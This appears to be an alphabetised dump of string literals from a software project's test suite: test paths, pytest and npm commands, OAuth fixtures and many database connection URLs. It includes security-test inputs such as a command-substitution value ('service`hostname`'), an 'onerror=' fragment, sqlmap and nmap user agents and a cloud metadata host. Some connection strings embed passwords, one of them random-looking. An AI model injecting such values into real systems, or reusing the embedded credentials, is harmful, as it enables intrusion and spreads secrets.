    "llm_calls",
    "llm_configs",
    "llm_costs",
    "llm_manager = LLMManager()",
    "llm_manager = Mock()",
    "llm_responses",
    "llm_services",
    "load",
    "load_test_config",
    "local",
    "localhost",
    "localhost in staging URL",
    "localhost,127.0.0.1,0.0.0.0",
    "localhost:",
    "localhost:5432",
    "localhost:5432/auth_db",
    "localhost_in_staging",
    "location",
    "lock_reason",
    "log_async_checkout",
    "log_patterns",
    "login",
    "login_attempt",
    "login_failed",
    "login_method",
    "login_success",
    "lognormal",
    "logout",
    "logout_type",
    "long",
    "long-running-token-for-shutdown-test",
    "low",
    "low error rate",
    "low_test_count",
    "low_throughput",
    "low_tier_coverage",
    "m=",
    "main.py",
    "main_db_sync.py",
    "main_password",
    "main_user",
    "major",
    "major violations to address soon",
    "malformed",
    "malformed.token",
    "malformed_response",
    "malicious_data",
    "malicious_headers",
    "manager",
    "managers",
    "manual_review",
    "mark",
    "markdown",
    "markers",
    "max",
    "max_error_rate",
    "max_latency_p50_ms",
    "max_latency_p95_ms",
    "max_workers",
    "may still exceed line limits",
    "medical_qa",
    "medium",
    "memory",
    "memory_aware",
    "memory_intensive",
    "memory_leak",
    "memory_mb",
    "memory_per_worker_mb",
    "memory_pressure",
    "message",
    "message_flow",
    "metadata",
    "metadata.google.internal",
    "method",
    "method exists",
    "method missing",
    "method\"\"\"\n        # TODO: Implement method test\n        pass",
    "method_names",
    "methods",
    "metrics",
    "microsoft/vscode",
    "microsoft_access_token_123",
    "microsoft_id_token_123",
    "microsoft_refresh_token_123",
    "mid",
    "mid|professional|advanced",
    "might expose:",
    "migration",
    "migration_pass",
    "migration_rollback_required",
    "migration_status",
    "migration_user",
    "migration_version_mismatch",
    "min",
    "minimal",
    "minor",
    "minor_issues",
    "minute",
    "minutes",
    "misc",
    "misses",
    "missing Cloud SQL path",
    "missing Content-Type header",
    "missing dependency:",
    "missing_args",
    "missing_assertion",
    "missing_attr",
    "missing_e2e",
    "missing_item",
    "missing_module",
    "missing_name",
    "missing_required_args",
    "missing_token",
    "mobile",
    "mock",
    "mock patterns found",
    "mock usages, should use real components",
    "mock-only tests in current sprint",
    "mock\\w*Context\\s*=",
    "mock_",
    "mock_\\w+\\s*=",
    "mock_access_token",
    "mock_analysis.json",
    "mock_auth_code_123",
    "mock_client_id",
    "mock_code_",
    "mock_component_class",
    "mock_component_function",
    "mock_component_pattern",
    "mock_components",
    "mock_count",
    "mock_implementation_comment",
    "mock_implementation_comments",
    "mock_only",
    "mock_reductions",
    "mock_refresh_token",
    "mock_user",
    "mocks (should be",
    "mocks, should use real components",
    "mode",
    "model",
    "model_costs_usd",
    "model_type",
    "model_usage",
    "module",
    "monitoring_alert",
    "more",
    "more errors",
    "more files",
    "more functions",
    "more suggestions",
    "more violations",
    "more violations in",
    "ms",
    "multi_service_coverage",
    "must have empty body, got",
    "mv",
    "nagios-plugins/2.3.3",
    "name",
    "naming_patterns",
    "needs_implementation",
    "netra",
    "netra-ai-staging",
    "netra-auth",
    "netra-auth-dev-instance",
    "netra-auth-service",
    "netra-auth-staging",
    "netra-auth-staging-001",
    "netra-auth-staging-instance",
    "netra-auth-test-instance",
    "netra-backend",
    "netra-frontend",
    "netra-platform",
    "netra-prod-backend",
    "netra-staging",
    "netra-staging-backend",
    "netra-staging:us-central1:staging-shared-postgres",
    "netra-test",
    "netra=oauth_flow",
    "netra_auth",
    "netra_backend",
    "netra_backend.app",
    "netra_backend.tests.test_utils",
    "netra_backend/alembic",
    "netra_backend/alembic.ini",
    "netra_backend/app",
    "netra_backend/pytest.ini",
    "netra_backend/tests",
    "netra_backend/tests/agents",
    "netra_backend/tests/conftest.py",
    "netra_backend/tests/core",
    "netra_backend/tests/core/test_config_manager.py::TestSecretManager::test_initialization",
    "netra_backend/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error",
    "netra_backend/tests/e2e/test_system_startup.py::TestSystemStartup",
    "netra_backend/tests/integration",
    "netra_backend/tests/integration/test_logging_audit_integration_core.py",
    "netra_backend/tests/integration/test_logging_audit_integration_helpers.py",
    "netra_backend/tests/integration/test_message_flow_auth_core.py",
    "netra_backend/tests/integration/test_message_flow_errors_core.py",
    "netra_backend/tests/integration/test_message_flow_errors_helpers.py",
    "netra_backend/tests/integration/test_message_flow_performance_core.py",
    "netra_backend/tests/integration/test_message_flow_performance_helpers.py",
    "netra_backend/tests/integration/test_message_flow_routing_core.py",
    "netra_backend/tests/integration/test_message_flow_routing_helpers.py",
    "netra_backend/tests/integration/test_unified_message_flow_core.py",
    "netra_backend/tests/integration/test_unified_message_flow_helpers.py",
    "netra_backend/tests/routes",
    "netra_backend/tests/routes/test_*auth*.py",
    "netra_backend/tests/routes/test_health_route.py",
    "netra_backend/tests/routes/test_websocket_*.py",
    "netra_backend/tests/services",
    "netra_backend/tests/services/agents",
    "netra_backend/tests/services/apex_optimizer_agent",
    "netra_backend/tests/services/database",
    "netra_backend/tests/services/test_security_service.py::test_encrypt_and_decrypt",
    "netra_backend/tests/test_agent_service_critical.py",
    "netra_backend/tests/test_api_agent_generation_critical.py",
    "netra_backend/tests/test_api_core_critical.py",
    "netra_backend/tests/test_api_endpoints_critical.py",
    "netra_backend/tests/test_api_error_handling_critical.py",
    "netra_backend/tests/test_api_threads_messages_critical.py",
    "netra_backend/tests/test_auth*.py",
    "netra_backend/tests/test_database*.py",
    "netra_backend/tests/test_websocket.py",
    "netra_backend\\.tests\\.e2e\\.",
    "netra_dev",
    "netra_dev database not found",
    "netra_development",
    "netra_prod",
    "netra_prod_user",
    "netra_production",
    "netra_stage",
    "netra_staging",
    "netra_staging_old",
    "netra_stg",
    "netra_test",
    "network_partition",
    "new",
    "new files.",
    "new_files_created",
    "new_mock_token",
    "new_password",
    "new_token",
    "next",
    "next_execution_config",
    "nmap",
    "no:warnings",
    "no_specific_test_found",
    "node",
    "node_modules",
    "non-critical violations found",
    "nonce",
    "none",
    "nonexistent-workflow",
    "nonexistent/repo123456",
    "nonexistent/repo123456789",
    "nonexistent_repo",
    "nonexistent_workflow",
    "normal",
    "normal_operation",
    "not concurrent and not performance",
    "not configured",
    "not e2e",
    "not found",
    "not found in database",
    "not integration",
    "not slow",
    "not-a-jwt",
    "not-a-jwt-at-all",
    "not-a-jwt-token",
    "not-a-url",
    "not.a.token",
    "not.jwt.token",
    "notAfter",
    "not_base64!@#$",
    "not_ready",
    "npm",
    "npm run test:critical -- --setupFilesAfterEnv='<rootDir>/",
    "npm run test:fast",
    "npm run test:integration -- --setupFilesAfterEnv='<rootDir>/",
    "npm run test:unit -- --setupFilesAfterEnv='<rootDir>/",
    "npm test",
    "npm test -- --passWithNoTests --ci --silent",
    "npm test -- --setupFilesAfterEnv='<rootDir>/",
    "npm.cmd",
    "npx",
    "nt",
    "oauth",
    "oauth2/v2/auth",
    "oauth_authentication_success_rate",
    "oauth_callback",
    "oauth_callback_completion_rate",
    "oauth_client",
    "oauth_code:",
    "oauth_config",
    "oauth_endpoint_availability_rate",
    "oauth_env_matching",
    "oauth_error",
    "oauth_initiation",
    "oauth_mock_token",
    "oauth_nonce:",
    "oauth_provider",
    "oauth_provider_error_rate",
    "oauth_redirect_uri_validation_success_rate",
    "oauth_response",
    "oauth_state:",
    "oauth_state_",
    "oauth_state_parameter_validation_rate",
    "oauth_token_123",
    "oauth_token_exchange_success_rate",
    "oauth_validation",
    "object_type",
    "observability",
    "observability|monitoring|logging|tracing|metrics",
    "occurrence_rate",
    "on OPTIONS",
    "onboard",
    "onerror=",
    "open",
    "openai",
    "openai|anthropic|gemini|gpt|claude",
    "openid email",
    "openid email profile",
    "openid profile",
    "operation_id",
    "optimization",
    "optimization_level",
    "optimization_recommendations",
    "optimize",
    "optimized_test_cache",
    "organizations",
    "origin",
    "original_file",
    "original_functions",
    "original_lines",
    "os",
    "os.environ",
    "os.getenv(\"ENVIRONMENT\", \"staging\")",
    "other",
    "output",
    "overall_similarity",
    "overall_status",
    "overall_success",
    "overflow",
    "overload-test-token-",
    "oversized files",
    "p50",
    "p50_latency_ms",
    "p95",
    "p95_latency_ms",
    "p99 latency",
    "p99_latency_ms",
    "p=",
    "package.json",
    "pandemic_surge",
    "parallel",
    "parallel_factor",
    "parallel_safe",
    "parameter",
    "parametrize",
    "partial_result",
    "partition",
    "partition-test-token-",
    "parts",
    "pass",
    "pass_rate",
    "passed",
    "passed,",
    "passed_tests",
    "password",
    "password authentication failed",
    "password authentication failed (attempt",
    "password authentication failed for user 'postgres'",
    "password authentication failed for user 'user_pr-4'",
    "password_change",
    "password_hasher",
    "password_reset",
    "patch",
    "patch(",
    "patch\\(",
    "path",
    "path.exists",
    "path_pattern",
    "paths",
    "pattern",
    "payload",
    "peak_hours",
    "peak_multiplier",
    "peak_rps",
    "pending",
    "pending_migrations_detected",
    "percent_covered",
    "percentage",
    "perf",
    "performance",
    "performance_analysis",
    "performance_data",
    "performance_degradation",
    "performance_grade",
    "performance_metrics",
    "performance_scores",
    "permission",
    "permission denied for table auth_users",
    "permission_check_bypass",
    "permission_check_failed",
    "permission_granted",
    "permission_id",
    "permission_revoked",
    "permissions",
    "pg_tables",
    "phase",
    "picture",
    "pid",
    "ping",
    "pkce",
    "placeholder",
    "placeholder password",
    "policy",
    "pong",
    "pool disposal failed",
    "pool:test:",
    "pool_size",
    "pool_test_password",
    "pool_test_user",
    "poolclass",
    "poor",
    "port",
    "port_allocation",
    "port_allocation           ‚Üí test_08_port_binding_race_conditions",
    "post-deploy-error",
    "post-deploy-warning",
    "post_deployment",
    "postgres",
    "postgres\" does not exist",
    "postgres-db-staging",
    "postgres-host-staging",
    "postgres-password-staging",
    "postgres-port-staging",
    "postgres-user-staging",
    "postgres:",
    "postgres://",
    "postgres://netra_user:password@/postgres?host=/cloudsql/instance&sslmode=require",
    "postgres://user:pass@/db?host=/cloudsql/instance&sslmode=prefer",
    "postgres://user:pass@host.com:5432/dbname",
    "postgres://user:pass@host:5432/db",
    "postgres://user:pass@localhost/db",
    "postgres:15",
    "postgres_DB",
    "postgres_db",
    "postgresql",
    "postgresql+asyncpg://",
    "postgresql+asyncpg://fake_user:fake_password@localhost:5432/fake_db",
    "postgresql+asyncpg://invalid:creds@localhost:5432/test",
    "postgresql+asyncpg://invalid:wrong@localhost:5432/test",
    "postgresql+asyncpg://invalid_user:wrong_password@localhost:5432/nonexistent_db",
    "postgresql+asyncpg://netra_staging:password@35.223.209.195:5432/netra_staging",
    "postgresql+asyncpg://netra_user:password@/postgres?host=/cloudsql/instance",
    "postgresql+asyncpg://postgres:",
    "postgresql+asyncpg://postgres:DTprdt5KoQXlEG4Gh9lF@localhost:5433/netra_dev",
    "postgresql+asyncpg://postgres:password@localhost:5432/auth",
    "postgresql+asyncpg://postgres:password@localhost:5432/netra_dev",
    "postgresql+asyncpg://postgres:postgres@localhost:5432/test_auth_service",
    "postgresql+asyncpg://postgres:test_password@localhost:5432/netra_dev",
    "postgresql+asyncpg://postgres:test_staging_password@/test_db?host=/cloudsql/test:region:instance",
    "postgresql+asyncpg://postgres:wrong@localhost:5432/test",
    "postgresql+asyncpg://test:test@localhost:5432/test",
    "postgresql+asyncpg://test:test@localhost:5432/test_db",
    "postgresql+asyncpg://user:pass@/db?host=/cloudsql/project:region:instance",
    "postgresql+asyncpg://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require",
    "postgresql+asyncpg://user:pass@host:5432/db",
    "postgresql+asyncpg://user:pass@host:5432/db?ssl=require",
    "postgresql+asyncpg://user:pass@host:5432/db?sslmode=require",
    "postgresql+asyncpg://user:pass@localhost/db",
    "postgresql+asyncpg://user:pass@localhost/db?sslmode=require",
    "postgresql+asyncpg://user:pass@localhost:5432/db",
    "postgresql+asyncpg://user_pr-4:password@localhost:5432/netra_auth",
    "postgresql+asyncpg://user_pr-4:wrong_password@/test_db?host=/cloudsql/test:region:instance",
    "postgresql+psycopg2://",
    "postgresql+psycopg2://user:pass@host:5432/db",
    "postgresql+psycopg2://user:pass@host:5432/db?sslmode=require",
    "postgresql+psycopg://user:pass@host:5432/db",
    "postgresql://",
    "postgresql://health_user:health_password@localhost:5432/test",
    "postgresql://main_user:main_password@localhost:5432/test",
    "postgresql://netra_staging:password@35.223.209.195:5432/netra_staging",
    "postgresql://netra_test:test_password@localhost:5433/netra_test",
    "postgresql://netra_user:$(STAGING_DB_PASSWORD)@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://netra_user:secret_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://netra_user:staging_pass@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://netra_user:staging_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://postgres:123@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:correct_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres&sslmode=require",
    "postgresql://postgres:password@/netra_staging?host=/cloudsql/wrong-project:region:instance",
    "postgresql://postgres:password@34.132.142.103:5432/netra_staging",
    "postgresql://postgres:password@localhost:5432/auth",
    "postgresql://postgres:password@localhost:5432/netra_staging",
    "postgresql://postgres:password@localhost:5432/testdb",
    "postgresql://postgres:secure_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:secure_password_123@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:secure_staging_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:wrong_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://postgres:wrong_password@cloudsql/auth_db",
    "postgresql://test:test@localhost:5432/netra_test",
    "postgresql://test:test@localhost:5432/test_db",
    "postgresql://user:pass@/db?host=/cloudsql/instance&ssl=require",
    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=disable",
    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=require",
    "postgresql://user:pass@/db?host=/cloudsql/project:region:instance",
    "postgresql://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require",
    "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance",
    "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance&sslmode=require",
    "postgresql://user:pass@34.132.142.103:5432/netra_staging?sslmode=require",
    "postgresql://user:pass@host/db?sslmode=require",
    "postgresql://user:pass@host:5432/db",
    "postgresql://user:pass@localhost/db",
    "postgresql://user:pass@localhost/db?ssl=require",
    "postgresql://user:pass@localhost/db?sslmode=require",
    "postgresql://user:pass@localhost/dbname?host=/cloudsql/project:region:instance",
    "postgresql://user:pass@localhost:5432/db",
    "postgresql://user:pass@localhost:5432/db?ssl=require",
    "postgresql://user:pass@localhost:5432/db?sslmode=require",
    "postgresql://user:pass@localhost:5432/dbname",
    "postgresql://user:pass@localhost:5432/dbname?sslmode=require",
    "postgresql://user:pass@localhost:5432/test_db",
    "postgresql://user:pass@staging-db:5432/db?sslmode=require",
    "postgresql://user@",
    "postgresql://user_pr-4:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://user_pr-4:some_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
    "postgresql://user_pr-4:wrong_password@localhost:5432/netra_staging",
    "postgres|PostgreSQL|psycopg",
    "potentially failing test files",
    "pr_number",
    "pre-deploy-1",
    "pre_deployment",
    "pre_deployment_validation",
    "pre_existing",
    "predictable patterns",
    "prepare",
    "previous",
    "primary-secret-1234567890123456789012345",
    "primary_issues",
    "priority",
    "priority failures to process",
    "priority_failure_count",
    "priority_failures",
    "process",
    "process(es).",
    "process_id",
    "processed",
    "prod",
    "production",
    "productivity_gain",
    "profile",
    "progress_tracking",
    "progression_rate",
    "project:region:instance",
    "projects/",
    "prompt_tokens",
    "proposed_files",
    "provider",
    "provider_data",
    "provider_integration",
    "provider_user_id",
    "providers",
    "psycopg",
    "psycopg2",
    "psycopg2 URL valid:",
    "push",
    "pyproject.toml",
    "pytest",
    "pytest-asyncio",
    "pytest-cov",
    "pytest-mock",
    "pytest-xdist",
    "pytest.ini",
    "pytest.mark.",
    "pytest.mark.asyncio",
    "pytest.mark.real_llm",
    "pytest_",
    "pytest_asyncio",
    "pytest_cov",
    "pytest_mock",
    "python",
    "python scripts/compliance/test_refactor_helper.py analyze app/tests/test_large.py",
    "python scripts/compliance/test_refactor_helper.py suggest app/tests/test_large.py",
    "python scripts/compliance/test_refactor_helper.py validate app/tests/test_large.py",
    "python scripts/compliance/test_size_validator.py",
    "python scripts/compliance/test_size_validator.py --format markdown",
    "python scripts/compliance/test_size_validator.py --output report.md",
    "python test_runner.py --level real_e2e",
    "python test_runner.py --level real_e2e --real-llm",
    "python test_runner.py --level real_e2e --real-llm --llm-model gemini-2.5-pro",
    "python unified_test_runner.py --category frontend --real-services",
    "python unified_test_runner.py --category integration --real-services --real-llm",
    "python unified_test_runner.py --level integration",
    "python unified_test_runner.py --skip-size-validation",
    "python unified_test_runner.py --strict-size",
    "python-requests/2.28.1",
    "quality_gates",
    "quality_metrics",
    "quality_scores",
    "quality_summary",
    "queue_depth",
    "quick",
    "quick_test",
    "quick_user",
    "r",
    "raceuser@example.com",
    "raise_runtime_error",
    "random",
    "rate_limit",
    "rate_limit_exceeded",
    "rate_limiting",
    "read",
    "read_only_mode",
    "read_write_permissions",
    "readiness_check_passed",
    "readiness_info",
    "readiness_separation",
    "readiness_separation      ‚Üí test_07_health_check_false_positives_during_init",
    "ready",
    "real",
    "real e2e tests:",
    "real_",
    "real_database",
    "real_e2e",
    "real_llm",
    "real_llm_coverage",
    "real_password",
    "real_services",
    "real_websocket",
    "realistic_test_data_service",
    "reason",
    "recent-test-",
    "recent_runs",
    "recommendation",
    "recommendations",
    "reconfigure",
    "reconnecting",
    "recovered",
    "recovering",
    "recovery:test",
    "recovery_detected",
    "recovery_start",
    "recovery_time_minutes",
    "recovery_timestamp",
    "recovery_validation_status",
    "redirect",
    "redirectUri",
    "redirect_test_code_",
    "redirect_uri",
    "redirect_uri contains auth service domain, not frontend domain",
    "redirect_uri path is /auth/callback",
    "redirect_uri uses correct protocol (http/https) for environment",
    "redirect_uri=",
    "redirect_uri_mismatch_error_count",
    "redirect_uri_validation",
    "redirect_url",
    "redis",
    "redis.Redis.get",
    "redis.Redis.ping",
    "redis.asyncio.from_url",
    "redis://invalid-host:9999",
    "redis://localhost:6379",
    "redis://localhost:6379/0",
    "redis://localhost:6379/1",
    "redis://localhost:6379/15",
    "redis://localhost:6380",
    "redis://staging-redis:6379/0",
    "redis:7",
    "redis_client",
    "redis_connection",
    "redis_url",
    "redis|Redis|REDIS",
    "redundant tests...",
    "refresh",
    "refresh123",
    "refresh_token",
    "refresh_token_",
    "refresh_token_123",
    "refresh_token_hash",
    "refreshed",
    "regular_user",
    "related",
    "relation \"auth_users\" does not exist",
    "remaining requests, got",
    "remove",
    "replace",
    "replacement",
    "replay",
    "report",
    "reports",
    "repository",
    "request_id",
    "request_success_rate",
    "request_timeout",
    "request_type",
    "requests",
    "requests caused resource issues. Total time:",
    "require",
    "required_services",
    "requires_real_llm",
    "requires_real_services",
    "research",
    "resilience",
    "resource",
    "resource_monitoring",
    "response",
    "response time degradation",
    "response_data",
    "response_time",
    "response_time_ms",
    "response_type=code",
    "results",
    "results in 'postgres' database which causes failures",
    "retry",
    "retry_after",
    "retry_later",
    "return\\s*\\[\\s*\\{\\s*[\"\\']id[\"\\']\\s*:\\s*[\"\\']1[\"\\']",
    "return\\s*\\{\\s*[\"\\']status[\"\\']\\s*:\\s*[\"\\']ok[\"\\']\\s*\\}",
    "return\\s*\\{\\s*[\"\\']test[\"\\']\\s*:\\s*[\"\\']data[\"\\']\\s*\\}",
    "returned",
    "returned 405 - CORS preflight requires OPTIONS support",
    "returned 405 Method Not Allowed - monitoring systems need HEAD support",
    "returned unexpected status",
    "returned unexpected type:",
    "revenue_to_cost_ratio",
    "review_assertion",
    "revocation-user-123",
    "revoke@example.com",
    "revoke@netrasystems.ai",
    "revoke_session",
    "rich",
    "risk_assessment",
    "risk_level",
    "role",
    "role_assignment",
    "root",
    "route",
    "route_traffic",
    "routes",
    "rps",
    "run",
    "run_",
    "run_server.py",
    "runner",
    "runners.py",
    "runs-on:",
    "s",
    "s (expected ~2s). Broken netra_dev connections are causing shutdown timeouts.",
    "s (limit:",
    "s - connections failed to close gracefully",
    "s - no fallback mechanism implemented",
    "s >",
    "s >=",
    "s but should respect",
    "s for 10 requests",
    "s limit",
    "s window",
    "s without waiting for database validation. Health check should detect slow database responses and report unhealthy.",
    "s)",
    "s) completed successfully",
    "s) timed out as expected",
    "s):",
    "s, Actual:",
    "s, invalid:",
    "s, should be <10s",
    "s, should fail quickly with fallback",
    "s. Broken database state should not amplify DoS attack effectiveness.",
    "safe_refresh",
    "safe_token",
    "scan_paths",
    "scan_timestamp",
    "scanner",
    "scanner-ip",
    "scenario",
    "scheduler",
    "schema",
    "schema validation failed: database \"postgres\" does not exist",
    "scope",
    "scope=",
    "scope=openid%20email%20profile",
    "score",
    "scripts",
    "scripts/dev_launcher.py",
    "scripts/verify_workflow_status.py",
    "search",
    "seasonality",
    "second_use",
    "seconds",
    "secret",
    "secrets_loading",
    "sections completed",
    "secure_password",
    "secure_websocket",
    "security",
    "security-scanner",
    "security-user-999",
    "security@example.com",
    "security_level",
    "seemingly_valid_password",
    "seemingly_valid_user",
    "self",
    "self.",
    "self.assertEqual",
    "self\\.(\\w+)",
    "self\\\\.assertEqual\\\\((.*?),\\\\s*(.*?)\\\\)",
    "self\\\\.assertFalse\\\\((.*?)\\\\)",
    "self\\\\.assertIsNone\\\\((.*?)\\\\)",
    "self\\\\.assertIsNotNone\\\\((.*?)\\\\)",
    "self\\\\.assertNotEqual\\\\((.*?),\\\\s*(.*?)\\\\)",
    "self\\\\.assertTrue\\\\((.*?)\\\\)",
    "sensitive",
    "server_error",
    "server_startup",
    "service",
    "service health check failed:",
    "service is healthy",
    "service returned",
    "service unavailable",
    "service-\nname",
    "service-123",
    "service-name$",
    "service-user",
    "service1",
    "service2",
    "service:auth_validate",
    "service:read",
    "service:session_create",
    "service:session_revoke",
    "service:user_lookup",
    "service:write",
    "service@netrasystems.ai",
    "service_discovery",
    "service_discovery         ‚Üí test_09_service_discovery_timing_issues",
    "service_id",
    "service_info",
    "service_limitations",
    "service_registry",
    "service_results",
    "service_secret",
    "service_status",
    "service_status_granularity",
    "service_token",
    "service_unavailable",
    "service_unavailable_page",
    "service_version",
    "service`hostname`",
    "services",
    "services/test_synthetic_data_service_v3.py",
    "session",
    "session1",
    "session123",
    "session2",
    "session:",
    "session:expired123",
    "session:session1",
    "session:session123",
    "session:session2",
    "session_1",
    "session_a",
    "session_b",
    "session_check",
    "session_created",
    "session_expired",
    "session_id",
    "session_limits_enforced",
    "session_management",
    "session_manager",
    "session_type",
    "session_validation_bypass",
    "sessions",
    "setUp",
    "setup",
    "setup_method",
    "setup_test_path",
    "setup_test_path()",
    "setup_test_path() not called",
    "setup_test_path\\(\\)\\n",
    "severities",
    "severity",
    "severity_breakdown",
    "share",
    "shared_utilities",
    "short",
    "should be blocked",
    "should be refactored manually",
    "should have empty body",
    "should have failed",
    "should match GET status",
    "should not decode successfully",
    "should not return 405 Method Not Allowed",
    "should return 200 or 204, got",
    "should_be_valid",
    "should_have_ssl",
    "should_pass",
    "should_receive_new_requests",
    "should_stay_in_rotation",
    "shutdown failed:",
    "shutdown_service",
    "side_effect =",
    "signal_handling",
    "signature",
    "signature verification failed",
    "signature-user-789",
    "signature@example.com",
    "signup",
    "similar",
    "similarity",
    "similarity relationships",
    "similarity_type",
    "simple",
    "site-packages",
    "size",
    "skip",
    "skipped",
    "skipped tests",
    "skipped_tests",
    "skipping all .env file loading (using GSM)",
    "sleep",
    "sleep(",
    "slow",
    "slow tests to improve CI/CD speed",
    "slow-db-host",
    "sm-staging-client-id-12345",
    "sm-staging-client-secret-67890",
    "smart_adaptive",
    "smoke",
    "soak",
    "socket",
    "span_id",
    "spec.",
    "specific_run_id",
    "split_by_",
    "split_by_category",
    "split_by_class",
    "split_by_feature",
    "splitting large file:",
    "splitting_suggestions",
    "sql_injection",
    "sqlalchemy",
    "sqlite",
    "sqlite+aiosqlite:///",
    "sqlite+aiosqlite:///:memory:",
    "sqlite+aiosqlite:///test_auth.db",
    "sqlite://",
    "sqlite:///test.db",
    "sqlmap/1.0",
    "sqlmap/1.6.2#stable (http://sqlmap.org)",
    "src",
    "ssl",
    "ssl parameter missing for regular connection",
    "ssl.create_default_context",
    "ssl=",
    "ssl=disable",
    "ssl=require",
    "ssl_parameter_resolution",
    "ssl_status",
    "sslcert=",
    "sslkey=",
    "sslmode",
    "sslmode not converted to ssl",
    "sslmode=",
    "sslmode=disable",
    "sslmode=require",
    "sslrootcert=",
    "stable_with_noise",
    "stage",
    "staging",
    "staging mode",
    "staging-client-id-12345",
    "staging-client-secret-67890",
    "staging-db-host",
    "staging-github-client-id",
    "staging-github-client-secret",
    "staging-google-client-id",
    "staging-google-client-secret",
    "staging-host",
    "staging-jwt-secret-1234567890123456789012345",
    "staging-quick",
    "staging-real",
    "staging-secret-1234567890123456789012345",
    "staging-shared-postgres.c7vdhks7dj2k.us-central1.gcp.cloud.sql.googleapis.com",
    "staging-specific-client-id",
    "staging-specific-client-secret",
    "staging-user",
    "staging-workflows",
    "staging.netrasystems.ai",
    "staging@netrasystems.ai",
    "staging_netra",
    "staging_password",
    "staging_secure_password_123",
    "staging_test_code",
    "staging_test_state",
    "staging_user",
    "staging_validation_",
    "standalone",
    "standard",
    "start_line",
    "start_time",
    "started",
    "starting",
    "startup or login or websocket",
    "startup.test",
    "startup_timeout",
    "state",
    "state with spaces",
    "state/with/slashes",
    "state:",
    "state=",
    "state_valid",
    "status",
    "status_code",
    "stop",
    "storage",
    "store",
    "store_true",
    "strategies",
    "strategy",
    "stream",
    "stress",
    "structural_similarity",
    "stub",
    "sub",
    "subject",
    "success",
    "success_count",
    "success_rate",
    "successful_requests",
    "suggest",
    "suggested_fixes",
    "suggestions",
    "summary",
    "superadmin",
    "superuser",
    "svc_id",
    "syntax errors remain - manual intervention may be needed",
    "syntax errors remain:",
    "syntax_error",
    "syntax_valid",
    "sys",
    "sys.path",
    "system",
    "system:manage_settings",
    "system:view_logs",
    "system:view_status",
    "system_paths",
    "t=",
    "table_accessibility",
    "table_output",
    "table_output_format",
    "tampered123",
    "target",
    "target_duration",
    "target_test",
    "tax_season",
    "team_collaboration",
    "team|collaboration|sharing|permissions",
    "tearDown",
    "teardown",
    "teardown_method",
    "technology_stack",
    "ten",
    "test",
    "test directories** identified\n- **",
    "test files",
    "test files are already failing!",
    "test files for category '",
    "test files to validate...",
    "test files** across the project (excluding dependencies)\n- **",
    "test files, found",
    "test files:",
    "test functions from",
    "test quality issues",
    "test request",
    "test requirement violations:",
    "test stubs in production code",
    "test(",
    "test*",
    "test*.py",
    "test-act-simple.yml",
    "test-api-key",
    "test-branch",
    "test-clickhouse-password-for-integration-testing",
    "test-client-id",
    "test-client-id.googleusercontent.com",
    "test-client-secret",
    "test-cloud-sql-host",
    "test-db-host",
    "test-env",
    "test-fernet-key-for-testing-only-base64encode=",
    "test-gemini-key-from-env",
    "test-github-client-id",
    "test-github-client-secret",
    "test-github-secret",
    "test-google-client",
    "test-google-client-id",
    "test-google-client-id-for-integration-testing",
    "test-google-client-id.apps.googleusercontent.com",
    "test-google-client-secret",
    "test-google-client-secret-for-integration-testing",
    "test-google-secret",
    "test-host",
    "test-jwt-key-from-env",
    "test-jwt-secret-key-32-chars-long",
    "test-jwt-secret-key-for-integration-testing-must-be-32-chars-minimum",
    "test-jwt-secret-key-that-is-long-enough-for-testing-purposes",
    "test-jwt-secret-key-that-is-long-enough-for-testing-purposes-and-very-secure",
    "test-oauth-client-id",
    "test-oauth-hmac-secret-32-chars",
    "test-oauth-secret",
    "test-related process(es):",
    "test-secret",
    "test-secret-key-for-testing-only-must-be-at-least-32-chars",
    "test-service",
    "test-service-id",
    "test-service-name",
    "test-service-secret-32-chars-long",
    "test-service-secret-for-cross-service-auth-32-chars-minimum-length",
    "test-session",
    "test-staging-client-id",
    "test-staging-client-secret",
    "test-staging-jwt-secret-key-12345678901234567890",
    "test-staging-service-secret-12345678901234567890",
    "test-token-123",
    "test-token-no-redis",
    "test-token-server-error",
    "test-token-when-service-down",
    "test-user",
    "test-user-123",
    "test-user-456",
    "test-user-789",
    "test.com",
    "test/repo",
    "test1",
    "test123",
    "test123456",
    "test1_category",
    "test1_complexity",
    "test1_file",
    "test1_lines",
    "test1_name",
    "test2",
    "test2_category",
    "test2_complexity",
    "test2_file",
    "test2_lines",
    "test2_name",
    "test:failover:health",
    "test:key",
    "test@example.com",
    "test@gmail.com",
    "test@netrasystems.ai",
    "test@tempmail.com",
    "test\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
    "test_",
    "test_(\\w+)_",
    "test_*.py",
    "test_.*?(\\w+)_\\w+$",
    "test_.*_e2e|e2e_test_|TestE2E|test_end_to_end",
    "test_.*_integration|integration_test_|TestIntegration",
    "test_.*_load|load_test_|TestLoad",
    "test_.*_performance|performance_test_|TestPerformance|test_.*_perf",
